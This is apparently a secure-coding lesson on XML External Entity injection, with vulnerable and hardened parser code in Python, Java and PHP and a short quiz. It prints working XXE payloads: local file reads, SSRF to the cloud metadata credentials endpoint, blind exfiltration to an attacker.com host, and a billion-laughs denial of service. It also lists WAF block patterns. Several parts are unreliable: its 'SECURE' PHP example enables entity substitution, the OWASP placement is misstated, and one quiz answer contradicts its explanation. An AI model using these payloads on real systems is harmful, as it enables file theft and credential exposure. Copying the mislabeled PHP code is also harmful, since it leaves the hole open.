title: XML External Entity (XXE)
codeExample:
# VULNERABLE - Parsing XML with external entities enabled
import xml.etree.ElementTree as ET

def parse_xml_vulnerable(xml_data):
    # Default parser may process external entities
    tree = ET.fromstring(xml_data)
    return tree

# Attack payload:
# <?xml version="1.0" encoding="UTF-8"?>
# <!DOCTYPE foo [
#   <!ENTITY xxe SYSTEM "file:///etc/passwd">
# ]>
# <root>&xxe;</root>

# SECURE - Disable external entity processing
import defusedxml.ElementTree as ET

def parse_xml_secure(xml_data):
    tree = ET.fromstring(xml_data)  # defusedxml blocks entities
    return tree
content:
## What is XXE?

XML External Entity (XXE) injection is a web security vulnerability that allows an attacker to interfere with an application's XML processing. It occurs when XML input containing a reference to an external entity is processed by a weakly configured XML parser.

XXE was added to the OWASP Top 10 2021 as part of A08: Software and Data Integrity Failures.

## How XML External Entities Work

### Document Type Definition (DTD)

DTDs define the structure and legal elements of an XML document. They can also define entities:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY myentity "Hello World">
]>
<root>&myentity;</root>

<!-- Internal entity -->
<!ENTITY myentity "Hello World">

<!-- External entity -->
<!ENTITY xxe SYSTEM "file:///etc/passwd">
<!ENTITY xxe SYSTEM "http://internal-server/secret.txt">
```

## XXE Attack Types

### 1. File Read Attack

Read local files from the server:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<user>
  <name>&xxe;</name>
</user>

<!-- For Windows -->
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
]>
```

### 2. Server-Side Request Forgery (SSRF)

Use XXE to make requests to internal services:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<user>
  <data>&xxe;</data>
</user>

<!-- AWS metadata endpoint -->
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
```

### 3. Blind XXE

Data exfiltration via out-of-band channels:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
]>
<root>&send;</root>

<!-- evil.dtd on attacker server -->
<!ENTITY % all "<!ENTITY send SYSTEM 'http://attacker.com/?data=%file;'>">
%all;
```

### 4. Denial of Service

```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///dev/urandom">
]>

<!-- Billion laughs attack -->
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
]>
<root>&lol4;</root>
```

## Vulnerable Code Examples

### Python (xml.etree)

```python
# VULNERABLE - Using default parser
import xml.etree.ElementTree as ET

def process_xml(xml_input):
    # This may process external entities depending on parser
    root = ET.fromstring(xml_input)
    return root.find('name').text

# VULNERABLE - Using lxml without restrictions
from lxml import etree

def process_lxml(xml_input):
    parser = etree.XMLParser(resolve_entities=True)  # DANGEROUS
    tree = etree.fromstring(xml_input.encode(), parser)
    return tree
```

### Java (DocumentBuilder)

```java
// VULNERABLE - Default DocumentBuilderFactory
import javax.xml.parsers.DocumentBuilderFactory;

public Document parseXml(String xml) throws Exception {
    DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
    // Missing: factory.setFeature(...)
    DocumentBuilder builder = factory.newDocumentBuilder();
    return builder.parse(new InputSource(new StringReader(xml)));
}

// VULNERABLE - SAXParser
SAXParserFactory factory = SAXParserFactory.newInstance();
SAXParser parser = factory.newSAXParser();
parser.parse(new InputSource(new StringReader(xml)), handler);
```

### PHP

```php
// VULNERABLE - SimpleXML
$xml = simplexml_load_string($request_data);  // Entities resolved

// VULNERABLE - DOMDocument
domxml = new DOMDocument();
domxml->loadXML($request_data);  // Entities resolved
```

## Secure Code Examples

### Python

```python
# SECURE - Using defusedxml
import defusedxml.ElementTree as ET

def parse_xml_secure(xml_input):
    tree = ET.fromstring(xml_input)  # Blocks all entity processing
    return tree

# SECURE - Using lxml with restrictions
from lxml import etree

def parse_lxml_secure(xml_input):
    parser = etree.XMLParser(
        resolve_entities=False,
        no_network=True,
        dtd_validation=False,
        load_dtd=False
    )
    return etree.fromstring(xml_input.encode(), parser)

# SECURE - Input validation before parsing
def validate_and_parse_xml(xml_input):
    # Check for suspicious patterns
    suspicious_patterns = ['<!ENTITY', 'SYSTEM', 'PUBLIC', '<!DOCTYPE']
    for pattern in suspicious_patterns:
        if pattern.lower() in xml_input.lower():
            raise ValueError('Invalid XML content')
    
    return ET.fromstring(xml_input)
```

### Java

```java
// SECURE - DocumentBuilderFactory with protections
public Document parseXmlSecure(String xml) throws Exception {
    DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
    
    // Disable DTDs entirely
    factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
    
    // Disable external entities
    factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
    factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
    
    // Disable external DTDs
    factory.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
    
    // Disable XInclude
    factory.setXIncludeAware(false);
    factory.setExpandEntityReferences(false);
    
    DocumentBuilder builder = factory.newDocumentBuilder();
    return builder.parse(new InputSource(new StringReader(xml)));
}
```

### PHP

```php
// SECURE - Disable entity loading
libxml_disable_entity_loader(true);

$dom = new DOMDocument();
$dom->loadXML($xml_data, LIBXML_NOENT | LIBXML_DTDLOAD);

// SECURE - Use simplexml with restrictions
$xml = simplexml_load_string($xml_data, 'SimpleXMLElement', LIBXML_NOENT);
```

## Prevention Strategies

### 1. Disable DTD Processing

The most effective prevention is to disable DTD processing entirely.

### 2. Use JSON Instead of XML

When possible, use JSON instead of XML:

```json
{
  "user": {
    "name": "John Doe",
    "email": "john@example.com"
  }
}
```

### 3. Input Validation

- Validate XML against a schema
- Reject XML containing DOCTYPE declarations
- Sanitize XML input before processing

### 4. Use Secure Libraries

- Python: defusedxml
- Java: Enable secure parser features
- PHP: libxml_disable_entity_loader()

### 5. WAF Rules

Deploy WAF rules to block XXE patterns:

```
# Common XXE patterns to block
<!DOCTYPE
<!ENTITY
SYSTEM "
PUBLIC "
```

## Key Takeaways

- XXE can lead to file read, SSRF, and denial of service
- Always disable DTD processing and external entities
- Use secure XML libraries (defusedxml)
- Prefer JSON over XML when possible
- Validate XML against strict schemas
- Test for XXE in all XML processing endpoints

quiz.question: What does XXE stand for?
quiz.explanation: XXE stands for XML External Entity, a vulnerability that allows attackers to include external entity references in XML documents.

quiz.question: Which attack can be performed using XXE?
quiz.explanation: XXE can be used to perform SSRF by making the server send requests to internal resources like cloud metadata endpoints.

quiz.question: What is the most effective way to prevent XXE?
options: D) Use JSON instead of XML
quiz.explanation: Disabling DTD processing completely prevents XXE attacks by ensuring XML parsers do not process external entity declarations.
